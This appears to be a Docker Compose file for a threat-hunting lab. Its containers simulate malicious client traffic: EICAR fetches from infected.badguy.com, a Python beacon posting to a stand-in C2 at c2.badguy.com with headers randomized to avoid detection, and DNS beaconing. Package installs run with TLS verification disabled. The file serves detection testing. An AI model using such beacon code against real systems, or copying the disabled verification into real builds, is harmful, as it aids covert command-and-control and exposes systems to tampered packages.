@@ -1,0 +1,269 @@
+## SSL Orchestrator :: Threat Hunting Lab :: Clients
+## Maintainer: kevin-at-f5-dot-com
+## Last Updated: 2025-Feb-07
+##
+## Description: Provides a set of containers to perform various client functions:
+##   - eicar_client
+##        src: 192.168.80.202
+##        function: Bash script to curl https://infected.badguy.com (to fetch eicar payload) on random interval (1-20s)
+##   - beacon_client
+##        src: 192.168.80.222
+##        function: Python script that queries beacon server at https://c2.badguy.com with beacon payload on 30s interval
+##   - random_requests_client
+##        src: 192.168.80.21  -> .68
+##        src: 192.168.80.70  -> .201
+##        src: 192.168.80.203 -> .221
+##        src: 192.168.80.223 -> .252
+##        function: Python script that selects a source IP at random and requests a random site from websites.txt file
+##   - dnsbeacon_client
+##        src: 192.168.80.69
+##        function: Bash script to dig beacon.cloudsecurity.ninja on 10s interval
+##
+## start containers
+##   docker compose -f docker-sslo-threathunting-clients-vX.yaml up -d
+##
+## watch containers
+##   docker logs -f eicar_client
+##   docker logs -f beacon_client
+##   docker logs -f random_requests_client
+##
+## stop containers
+##   docker compose -f docker-sslo-threathunting-clients-vX.yaml down
+
+services:
+  eicar_client:
+    container_name: eicar_client
+    image: ubuntu:22.04
+    restart: unless-stopped
+    dns: 192.168.100.8
+    networks:
+      clientnet:
+        ipv4_address: 192.168.80.202
+    command:
+      - /bin/bash
+      - -c
+      - |
+        ## update and install required binaries
+        apt -o "Acquire::https::Verify-Peer=false" update
+        apt -o "Acquire::https::Verify-Peer=false" install -y iproute2 curl iputils-ping net-tools
+
+        ## start container with infinite curl loop -- sleep for some random time between 60 and 120 seconds
+        sleep 20
+        while true
+        do
+          curl -sk https://infected.badguy.com
+          sleep $$(( (RANDOM % 60) + 60 ))
+        done
+
+  
+  beacon_client:
+    # ref: https://github.com/snowblind-/beaconClient
+    container_name: beacon_client
+    image: ubuntu:22.04
+    restart: unless-stopped
+    dns: 192.168.100.8
+    networks:
+      clientnet:
+        ipv4_address: 192.168.80.222
+    command:
+      - /bin/bash
+      - -c
+      - |
+        ## update and install required binaries
+        apt -o "Acquire::https::Verify-Peer=false" update
+        apt -o "Acquire::https::Verify-Peer=false" install -y iproute2 curl iputils-ping net-tools python3 python3-requests
+
+        ## create beaconClient.py
+        cat > "/beaconClient.py" << 'EOF'
+        import requests
+        import time
+        import ssl
+        import random
+        import logging
+        import warnings
+        import socket
+        from urllib3.exceptions import InsecureRequestWarning
+        from random import randrange
+
+        # Suppress SSL warnings
+        warnings.simplefilter('ignore', InsecureRequestWarning)
+
+        # Set up logging
+        logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
+
+        # Specify the source IP address for the beacon (you can modify this as needed)
+        src_ip = '192.168.80.222'  # Example source IP (change to your desired IP)
+
+        # C2 server URL (you can modify this to the actual server you're targeting)
+        C2_SERVER_URL = [
+            "https://c2.badguy.com/beacon"
+        ]
+
+        # Payload to send
+        PAYLOAD = "{beacon:fire away!}"
+
+        # Time interval between beacons (in seconds)
+        BEACON_INTERVAL = 30  # 30 seconds as an example
+
+        # Create a session that binds to the specified source address
+        def session_for_src_addr(addr: str) -> requests.Session:
+            """
+            Create a `Session` which will bind to the specified local address
+            """
+            session = requests.Session()
+            for prefix in ('http://', 'https://'):
+                session.get_adapter(prefix).init_poolmanager(
+                    connections=requests.adapters.DEFAULT_POOLSIZE,
+                    maxsize=requests.adapters.DEFAULT_POOLSIZE,
+                    # This binds to the specified IP address
+                    source_address=(addr, 0),
+                )
+            return session
+
+        # Simulate the beacon
+        def send_beacon(src_ip: str):
+            try:
+                # Randomizing the headers slightly to avoid detection
+                headers = {
+                    "User-Agent": f"CustomUserAgent/{random.randint(1, 100)}",
+                    "Content-Type": "application/json"
+                }
+
+                # Payload data that is sent to the C2 server
+                data = {
+                    "payload": PAYLOAD
+                }
+
+                # Randomly select one of the C2 server URLs
+                selected_URL = random.choice(C2_SERVER_URL)
+
+                # Create the session that binds to the given source IP address
+                session = session_for_src_addr(src_ip)
+
+                # Send POST request to the C2 server, skipping SSL verification
+                response = session.post(selected_URL, json=data, headers=headers, verify=False)
+
+                # Log the response from the server
+                if response.status_code == 200:
+                    logging.info("Beacon sent successfully. Server Response: %s", response.text)
+                else:
+                    logging.warning("Failed to send beacon. Status Code: %d, Response: %s", response.status_code, response.text)
+
+            except requests.exceptions.RequestException as e:
+                logging.error("Error sending beacon: %s", e)
+
+        # Main function to repeatedly send beacons -- sleep for some random number between 1 and BEACON_INTERVAL
+        def main():
+            logging.info("Beacon script started.")
+
+            while True:
+                send_beacon(src_ip)
+                # sleeper = randrange(BEACON_INTERVAL)
+                # time.sleep(sleeper)
+                time.sleep(BEACON_INTERVAL)
+
+        if __name__ == "__main__":
+            main()
+        EOF
+
+        ## start beaconClient
+        python3 /beaconClient.py
+
+
+  random_requests_client:
+    # ref: https://github.com/snowblind-/randomRequests
+    container_name: random_requests_client
+    image: ubuntu:22.04
+    restart: unless-stopped
+    dns: 192.168.100.8
+    cap_add:
+      - NET_ADMIN
+    networks:
+      clientnet:
+        ipv4_address: 192.168.80.20
+    command:
+      - /bin/bash
+      - -c
+      - |
+        ## update and install required binaries
+        apt -o "Acquire::https::Verify-Peer=false" update
+        apt -o "Acquire::https::Verify-Peer=false" install -y iproute2 git curl python3 python3-pip iputils-ping net-tools
+        pip3 install --trusted-host pypi.org --trusted-host files.pythonhosted.org pip requests psutil
+ 
+        ## import randomRequests project
+        git -c http.sslVerify=false clone https://github.com/snowblind-/randomRequests.git
+ 
+        ## add ipv4 addresses
+        ## ips: 192.168.80.21  -> .68
+        ## ips: 192.168.80.70  -> .201
+        ## ips: 192.168.80.203 -> .221
+        ## ips: 192.168.80.223 -> .252     
+        
+        for i in `seq 21 1 68`
+        do
+          ip address add 192.168.80.$$i dev eth0
+        done
+
+        for i in `seq 70 1 201`
+        do
+          ip address add 192.168.80.$$i dev eth0
+        done
+
+        for i in `seq 203 1 221`
+        do
+          ip address add 192.168.80.$$i dev eth0
+        done
+
+        for i in `seq 223 1 252`
+        do
+          ip address add 192.168.80.$$i dev eth0
+        done
+ 
+        ## start container in infinite loop
+        #tail -f /dev/null
+ 
+        ## start container with randomRequest execution
+        sleep 20
+        while true
+        do
+          python3 /randomRequests/randomRequests.py eth0 /randomRequests/websites.txt --interval 1
+          sleep 120
+        done
+
+
+  dnsbeacon_client:
+    container_name: dnsbeacon_client
+    image: ubuntu:22.04
+    restart: unless-stopped
+    dns: 192.168.100.8
+    networks:
+      clientnet:
+        ipv4_address: 192.168.80.69
+    command:
+      - /bin/bash
+      - -c
+      - |
+        ## update and install required binaries
+        apt -o "Acquire::https::Verify-Peer=false" update
+        apt -o "Acquire::https::Verify-Peer=false" install -y iproute2 curl iputils-ping net-tools dnsutils
+
+        ## start container with infinite curl loop
+        sleep 20
+        while true
+        do
+          dig beacon.cloudsecurity.ninja
+          sleep 10
+        done
+      
+
+networks:
+  clientnet:
+    driver: macvlan
+    driver_opts:
+      parent: ens7.800
+    ipam:
+      driver: default
+      config:
+        - subnet: 192.168.80.0/24
+          gateway: 192.168.80.7
+        
